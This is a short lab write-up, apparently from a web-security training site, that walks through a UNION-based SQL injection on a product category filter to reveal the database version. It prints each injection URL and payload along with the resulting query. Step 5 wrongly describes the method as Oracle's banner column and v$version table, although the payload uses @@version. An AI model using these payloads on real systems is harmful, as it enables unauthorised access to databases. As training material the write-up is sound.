Problem description
Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

End Goal: To display the database type and version on MySQL and Microsoft database using a UNION attack

Step 1:
Check for SQL vulnerablity in the category filter by adding '
https://0a370065038ef8a7808f2b8b0077003d.web-security-academy.net/filter?category=Gifts'
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '''
Observation: you should get an Internal server error due to syntax violation

Step2:
Inject SQL while correcting syntax violation
https://0a370065038ef8a7808f2b8b0077003d.web-security-academy.net/filter?category=Gifts'--%20
[%20 is required for comments in MySQL]
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = ''
Observation: website should display the data normally

Step3:
add UNION clause to find the number of text columns by firstly adding one column , this is trial and error
https://0a370065038ef8a7808f2b8b0077003d.web-security-academy.net/filter?category=Gifts' union select  'abc'--
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = 'Gifts' UNION SELECT 'abc'
Observation: we got Internal server error since the table dimensions don't match

Step4:
add UNION clause to find the number of text columns, this time two sample texts
https://0a370065038ef8a7808f2b8b0077003d.web-security-academy.net/filter?category=Gifts' union select  'abc', 'def'--
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = 'Gifts' UNION SELECT 'abc', 'def'
Observation: The website works normally, displaying the unioned fields at the end.

Step5:
use banner column and v$version table to reveal the database type and version
https://0a370065038ef8a7808f2b8b0077003d.web-security-academy.net/filter?category=Gifts' union select @@version, null--
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = 'Gifts' UNION SELECT @@version, NULL
Observation: The website works normally while also reveal meta information about the database




https://0a370065038ef8a7808f2b8b0077003d.web-security-academy.net/filter?category=Gifts' union select @@version, 'def' --%20